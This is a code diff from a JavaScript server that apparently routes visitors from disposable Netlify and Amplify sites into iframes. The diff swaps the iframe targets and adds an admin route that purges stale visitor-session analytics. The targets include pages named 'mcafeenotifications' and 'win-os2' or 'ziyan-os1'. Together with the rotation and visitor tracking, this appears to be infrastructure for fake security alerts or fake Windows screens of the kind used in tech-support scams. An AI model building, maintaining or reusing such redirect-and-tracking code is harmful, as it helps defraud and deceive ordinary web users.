@@ -86,7 +86,7 @@ async function getRotationTarget(key) {
 const ORIGIN_GROUPS = {
   rocky: {
     "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "elegant-truffle-a0f9f7.netlify.app", redisKey: "rotation:target_url" },
-    "https://main.dzszig6ylykdh.amplifyapp.com": { method: "iframe", target: "https://win-os2.vercel.app" },
+    "https://main.dzszig6ylykdh.amplifyapp.com": { method: "iframe", target: "https://ziyan-os1.vercel.app" },
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
@@ -96,8 +96,8 @@ const ORIGIN_GROUPS = {
   },
   dmc: {
     // "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://n-rand.vercel.app", redisKey: "rotation:target_url" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://win-os2.vercel.app" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://win-os2.vercel.app" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://ziyan-os1.vercel.app" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os1.vercel.app" },
   },
   aomine: {
     "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
@@ -867,6 +867,30 @@ app.get("/admin/analytics/session/:id/events", async (req, res) => {
     const raw = await redis.lrange(keySessionEvents(req.params.id), 0, -1);
     const events = raw.map((r) => { try { return JSON.parse(r); } catch { return null; } }).filter(Boolean);
     res.json({ events });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post("/admin/analytics/clear-stale", async (req, res) => {
+  try {
+    const ids = await redis.zrevrange(KEY_ANALYTICS, 0, -1);
+    const cutoff = Date.now() - 5 * 60 * 1000;
+    const stale = [];
+    for (const id of ids) {
+      const s = await redis.hgetall(keySession(id));
+      if (!s || !s.id || Number(s.lastSeen) < cutoff) stale.push(id);
+    }
+    if (stale.length) {
+      const tx = redis.multi();
+      for (const id of stale) {
+        tx.del(keySession(id));
+        tx.del(keySessionEvents(id));
+        tx.zrem(KEY_ANALYTICS, id);
+      }
+      await tx.exec();
+    }
+    res.json({ cleared: stale.length });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
